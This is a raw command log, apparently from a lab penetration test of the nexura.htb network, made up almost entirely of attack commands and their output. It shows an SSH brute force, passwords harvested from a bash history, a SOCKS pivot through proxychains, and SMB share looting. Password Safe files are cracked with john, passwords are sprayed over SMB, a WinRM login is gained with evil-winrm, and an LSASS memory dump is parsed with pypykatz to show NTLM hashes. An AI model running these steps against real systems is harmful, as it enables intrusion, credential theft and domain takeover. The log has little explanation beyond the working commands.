1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-28 09:22:14

ssh jbetty@10.129.234.116
> Texas123!@#

ls -la
> .bash_history

cat .bash_history
```

```
jbetty@DMZ01:~$ cat .bash_history 
cd ~/projects
ls
git status
git pull origin main
vim README.md
cat ~/.bashrc
sudo apt update
sudo apt upgrade -y
clear
cd ~/Downloads
ls -lh
rm -rf old_project/
mkdir temp
cd temp
touch test.py
nano test.py
python3 test.py
pip install requests
pip install flask
history
df -h
free -m
top
htop
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
sudo systemctl status apache2
sudo systemctl restart apache2
cd /etc/nginx/sites-available
ls
cat default
sudo nano default
sudo nginx -t
sudo systemctl reload nginx
cd ~
mkdir scripts
cd scripts
vim backup.sh
chmod +x backup.sh
./backup.sh
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
logout
exit
cd /var/log
ls -ltr
sudo tail -f syslog
sudo journalctl -xe
sudo dmesg | less
ps aux | grep python
kill -9 13245
git clone https://github.com/example/repo.git
cd repo
ls -a
code .
npm install
npm run dev
cd ..
rm -rf repo/
curl https://ipinfo.io
ping google.com
traceroute github.com
whoami
groups
sudo adduser testuser
sudo usermod -aG sudo testuser
su - testuser
exit
passwd
uptime
reboot
mkdir ~/backup
rsync -av ~/Documents/ ~/backup/
du -sh *
alias ll='ls -alF'
unalias ll
history | grep ssh
find . -name "*.log"
grep -r "ERROR" /var/log/
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head
chmod 755 script.sh
chown user:user script.sh
git checkout -b feature/login
git commit -am "Add login feature"
git push origin feature/login
git merge main
git push
git log --oneline
docker ps
docker images
docker run -it ubuntu bash
exit
cd /tmp
touch index.html
echo "<h1>Hello World</h1>" > index.html
cat index.html
python3 -m http.server
curl localhost:8000
ctrl+c
tmux
tmux new -s dev
tmux ls
tmux attach -t dev
tmux kill-session -t dev
man rsync
man chown
crontab -e
lsblk
mount
umount /dev/sdb1
lsusb
lscpu
sudo apt install tree
tree
zip -r archive.zip folder/
unzip archive.zip
wget http://example.com/file.zip
tar -xzvf file.tar.gz
tar -czvf archive.tar.gz folder/
logout

clear
ls -l
clear
ls -l
clear
nano .bash_history
su
clear
ls -l
nano .bash_history
echo > .bash_history
nano .bash_history
less .bash_history 
clear
exit
pwd
cat .bash_history 
exit
```

```bash
sshpass -p 'dealer-screwed-gym1' ssh hwilliam@172.16.119.10

Command 'sshpass' not found, but can be installed with:

apt install sshpass
Please ask your administrator.

# We try to connect using the credentials provided in the text file
ssh hwilliam@172.16.119.10

ping -c 3 172.16.119.10
nc -zv 172.16.119.10 22

# But we see we cannot connect to the host, so...
ip route
default via 10.129.0.1 dev ens160 
10.129.0.0/16 dev ens160 proto kernel scope link src 10.129.234.116 
172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13 

which nmap
for p in 22 135 139 445 3389 5985 5986; do
  timeout 1 bash -c "echo > /dev/tcp/172.16.119.10/$p" 2>/dev/null && echo "$p abierto"
done
135 abierto
445 abierto
3389 abierto
5985 abierto

ssh -D 1080 jbetty@10.129.234.116

sudo apt update && sudo apt install proxychains -y
sudo nano /etc/proxychains4.conf
> socks5 127.0.0.1 1080

source venv/bin/activate
proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1'

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:135  ...  OK
SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 

proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' --shares
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:135  ...  OK
SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions            Remark
SMB         172.16.119.10   445    FILE01           -----           -----------            ------
SMB         172.16.119.10   445    FILE01           ADMIN$                                 Remote Admin
SMB         172.16.119.10   445    FILE01           C$                                     Default share
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE             
SMB         172.16.119.10   445    FILE01           IPC$            READ                   Remote IPC
SMB         172.16.119.10   445    FILE01           IT                                     
SMB         172.16.119.10   445    FILE01           MANAGEMENT                             
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE             
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE   

proxychains nxc smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' -M spider_plus

proxychains smbclient //172.16.119.10/PRIVATE -U 'nexura.htb\hwilliam%dealer-screwed-gym1'

ls
cd hwilliam
ls
>   .                                   D        0  Tue Apr 29 12:16:58 2025
  ..                                  D        0  Tue Apr 29 12:16:58 2025
  Online passwords.xlsx               A     7360  Tue Apr 29 12:16:49 2025
  Payslips                            D        0  Tue Apr 29 12:12:36 2025
  Photos                              D        0  Tue Apr 29 12:13:31 2025

get "Online passwords.xlsx"

proxychains smbclient //172.16.119.10/HR -U 'nexura.htb\hwilliam%dealer-screwed-gym1'

ls
smb: \> ls
  .                                   D        0  Tue Apr 29 12:08:28 2025
  ..                                  D        0  Tue Apr 29 12:08:28 2025
  2024                                D        0  Tue Apr 29 12:08:16 2025
  2025                                D        0  Tue Apr 29 12:07:24 2025
  Archive                             D        0  Tue Apr 29 12:10:24 2025

proxychains smbclient //172.16.119.10/TRANSFER -U 'nexura.htb\hwilliam%dealer-screwed-gym1'

smb: \> ls
  .                                   D        0  Tue Apr 29 11:45:14 2025
  ..                                  D        0  Tue Apr 29 11:45:14 2025

		5056511 blocks of size 4096. 1580544 blocks available

proxychains smbclient //172.16.119.10/HR -U 'nexura.htb\hwilliam%dealer-screwed-gym1'

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 29 12:08:28 2025
  ..                                  D        0  Tue Apr 29 12:08:28 2025
  2024                                D        0  Tue Apr 29 12:08:16 2025
  2025                                D        0  Tue Apr 29 12:07:24 2025
  Archive                             D        0  Tue Apr 29 12:10:24 2025

		5056511 blocks of size 4096. 1580528 blocks available
smb: \> cd Archive
smb: \Archive\> ls
  .                                   D        0  Tue Apr 29 12:10:24 2025
  ..                                  D        0  Tue Apr 29 12:10:24 2025
  Code of Conduct_OLD.xlsx            A    29380  Tue Apr 29 12:02:27 2025
  Company presentation OLD.ppt        A   912384  Tue Apr 29 12:02:52 2025
  Covid 19 Policy.ppt                 A   912384  Tue Apr 29 12:02:52 2025
  Employee Roster 2023.xlsx           A    13246  Tue Apr 29 12:02:30 2025
  Employee-Passwords_OLD.plk          A       48  Tue Apr 29 11:13:43 2025
  Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 11:09:57 2025
  Employee-Passwords_OLD_011.ibak      A      856  Tue Apr 29 11:10:02 2025
  Employee-Passwords_OLD_012.ibak      A      904  Tue Apr 29 11:10:04 2025
  Employee-Passwords_OLD_013.ibak      A      952  Tue Apr 29 11:10:07 2025
  Employee_handbook_2025.doc          A    26069  Tue Apr 29 12:02:39 2025
  Exit interview Questions.docx       A    34375  Tue Apr 29 12:01:34 2025
  HR Audit Guide ARCHIVE.docx         A    34375  Tue Apr 29 12:01:34 2025
  HR Budget Forecast 2026.xlsx        A    32924  Tue Apr 29 12:02:28 2025
  HR Policies and Procedures.docx      A   120515  Tue Apr 29 12:01:34 2025
  HRIS System Training.xlsx           A    29380  Tue Apr 29 12:02:27 2025
  Interview Questions Template.doc      A    32768  Tue Apr 29 12:02:38 2025
  Manager Onboarding Program.ppt      A   530432  Tue Apr 29 12:02:52 2025
  Offboarding Checklist.docx          A  1311881  Tue Apr 29 12:01:35 2025
  Offer Letter Template_OLD.docx      A   120515  Tue Apr 29 12:01:34 2025
  Password Policy OUTDATED.doc        A    32768  Tue Apr 29 12:02:38 2025
  PTO Tracking Sheet OLD.ppt          A  1028096  Tue Apr 29 12:02:49 2025
  Temporary Contractor List_OLD.xlsx      A    32924  Tue Apr 29 12:02:28 2025

get Employee-Passwords_OLD.plk
get Employee-Passwords_OLD.psafe3
get Employee-Passwords_OLD_011.ibak
get Employee-Passwords_OLD_012.ibak
get Employee-Passwords_OLD_013.ibak
exit

cd john/run/
python3 pwsafe2john.py /home/mapacheroja22/Employee-Passwords_OLD.psafe3 > pwsafe.hash

john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 512/512 AVX-512 16x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
michaeljackson   (Employee-Passwords_OLD)     
1g 0:00:00:18 DONE (2026-07-28 10:07) 0.05402g/s 885.1p/s 885.1c/s 885.1C/s 123456..christal
Use the "--show" option to display all of the cracked passwords reliably
Session completed

sudo apt install passwordsafe -y
pwsafe "Employee-Passwords_OLD.psafe3"

> michaeljackson

David Brittni (bdavid)
caramel-cigars-reply1

Tom Sandy (stom)
fails-nibble-disturb4

William Hallam (hwilliam)
warned-wobble-occur8

nano usuarios.txt
nano passwords.txt

proxychains nxc smb 172.16.119.7 172.16.119.10 172.16.119.11 -u usuarios.txt -p passwords.txt --continue-on-success
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:445 [proxychains] StrRunning nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FILE01) (domain:nexura.htb) (signing:False) (SMBv1:False)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False) (Null Auth:True)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445 <--socket error or timeout!
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  1RuRunning RunRunnRunning nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:-- ...  OK
SMB         172.16.119.10   445    FILE01           [-] nexura.htb\stom:warned-wobble-occur8 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   0% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:caramel-cigars-reply1 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:-- ...  OK
Running nxc against 3 targets ━━━━━━━━━━━━━╺━━━━━━━━━━━━━━━━━━━━━━━━━━  33% -:--:--<--socket error or timeout!
SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:fails-nibble-disturb4 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
SMB         172.16.119.11   445    DC01             [-] nexura.htb\hwilliam:warned-wobble-occur8 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08[proxychains] Strict chain  ...  127.0.0.1:1080  ..Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━━━━━━━━  67% 0:00:08 ...  OK
SMB         172.16.119.11   445    DC01             [-] nexura.htb\stom:warned-wobble-occur8 STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

SMB         172.16.119.10   445    FILE01           [+] nexura.htb\bdavid:caramel-cigars-reply1 

SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 

proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --admin-count
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
LDAP        172.16.119.11   389    DC01             Administrator
LDAP        172.16.119.11   389    DC01             krbtgt
LDAP        172.16.119.11   389    DC01             stom
❯ proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --groups
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
LDAP        172.16.119.11   389    DC01             -Group-                                  -Members- -Description-                                               
LDAP        172.16.119.11   389    DC01             Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
LDAP        172.16.119.11   389    DC01             Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
LDAP        172.16.119.11   389    DC01             Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP        172.16.119.11   389    DC01             Print Operators                          0         Members can administer printers installed on domain controllers
LDAP        172.16.119.11   389    DC01             Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
LDAP        172.16.119.11   389    DC01             Replicator                               0         Supports file replication in a domain
LDAP        172.16.119.11   389    DC01             Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
LDAP        172.16.119.11   389    DC01             Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
LDAP        172.16.119.11   389    DC01             Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
LDAP        172.16.119.11   389    DC01             Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
LDAP        172.16.119.11   389    DC01             Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
LDAP        172.16.119.11   389    DC01             IIS_IUSRS                                1         Built-in group used by Internet Information Services.
LDAP        172.16.119.11   389    DC01             Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
LDAP        172.16.119.11   389    DC01             Event Log Readers                        0         Members of this group can read event logs from local machine
LDAP        172.16.119.11   389    DC01             Certificate Service DCOM Access          0         Members of this group are allowed to connect to Certification Authorities in the enterprise
LDAP        172.16.119.11   389    DC01             RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
LDAP        172.16.119.11   389    DC01             RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
LDAP        172.16.119.11   389    DC01             RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
LDAP        172.16.119.11   389    DC01             Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
LDAP        172.16.119.11   389    DC01             Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
LDAP        172.16.119.11   389    DC01             Remote Management Users                  0         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
LDAP        172.16.119.11   389    DC01             Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
LDAP        172.16.119.11   389    DC01             Domain Computers                         0         All workstations and servers joined to the domain
LDAP        172.16.119.11   389    DC01             Domain Controllers                       0         All domain controllers in the domain
LDAP        172.16.119.11   389    DC01             Schema Admins                            1         Designated administrators of the schema
LDAP        172.16.119.11   389    DC01             Enterprise Admins                        1         Designated administrators of the enterprise
LDAP        172.16.119.11   389    DC01             Cert Publishers                          0         Members of this group are permitted to publish certificates to the directory
LDAP        172.16.119.11   389    DC01             Domain Admins                            2         Designated administrators of the domain
LDAP        172.16.119.11   389    DC01             Domain Users                             0         All domain users
LDAP        172.16.119.11   389    DC01             Domain Guests                            0         All domain guests
LDAP        172.16.119.11   389    DC01             Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
LDAP        172.16.119.11   389    DC01             RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
LDAP        172.16.119.11   389    DC01             Server Operators                         0         Members can administer domain servers
LDAP        172.16.119.11   389    DC01             Account Operators                        0         Members can administer domain user and group accounts
LDAP        172.16.119.11   389    DC01             Pre-Windows 2000 Compatible Access       1         A backward compatibility group which allows read access on all users and groups in the domain
LDAP        172.16.119.11   389    DC01             Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
LDAP        172.16.119.11   389    DC01             Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
LDAP        172.16.119.11   389    DC01             Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
LDAP        172.16.119.11   389    DC01             Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP        172.16.119.11   389    DC01             Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP        172.16.119.11   389    DC01             Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
LDAP        172.16.119.11   389    DC01             Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        172.16.119.11   389    DC01             Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
LDAP        172.16.119.11   389    DC01             Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
LDAP        172.16.119.11   389    DC01             Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
LDAP        172.16.119.11   389    DC01             Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
LDAP        172.16.119.11   389    DC01             DnsAdmins                                0         DNS Administrators Group
LDAP        172.16.119.11   389    DC01             DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
LDAP        172.16.119.11   389    DC01             HR                                       1         
LDAP        172.16.119.11   389    DC01             IT                                       1         
LDAP        172.16.119.11   389    DC01             MANAGEMENT                               1                                      

proxychains nxc ldap 172.16.119.11 -u bdavid -p 'caramel-cigars-reply1' --bloodhound --collection All --dns-server 172.16.119.11
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:636  ...  OK
LDAP        172.16.119.11   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) (signing:None) (channel binding:No TLS cert) 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.11:389  ...  OK
LDAP        172.16.119.11   389    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
LDAP        172.16.119.11   389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        172.16.119.11   389    DC01             Excluded collection methods: 
LDAP        172.16.119.11   389    DC01             [-] Bloodhound-python failed to resolve domain information, try specifying the DNS server.


```

```bash
nxc winrm 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
WINRM       172.16.119.7    5985   JUMP01           [*] Windows 10 / Server 2019 Build 17763 (name:JUMP01) (domain:nexura.htb) 
WINRM       172.16.119.7    5985   JUMP01           [+] nexura.htb\bdavid:caramel-cigars-reply1 (Pwn3d!)

evil-winrm -i 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
cd C:\Windows\Temp
download lsass.dmp /home/mapacheroja22/lsass.dmp

source venv/bin/activate
❯ pypykatz lsa minidump /home/mapacheroja22/lsass.dmp
INFO:pypykatz:Parsing file /home/mapacheroja22/lsass.dmp
FILE: ======== /home/mapacheroja22/lsass.dmp =======
== LogonSession ==
authentication_id 1303282 (13e2f2)
session_id 0
username bdavid
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:55:40.551418+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1105
luid 1303282

== LogonSession ==
authentication_id 1237551 (12e22f)
session_id 0
username bdavid
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:50:09.729700+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1105
luid 1237551

== LogonSession ==
authentication_id 267098 (4135a)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-07-29T12:38:16.169416+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267098
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [4135a]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
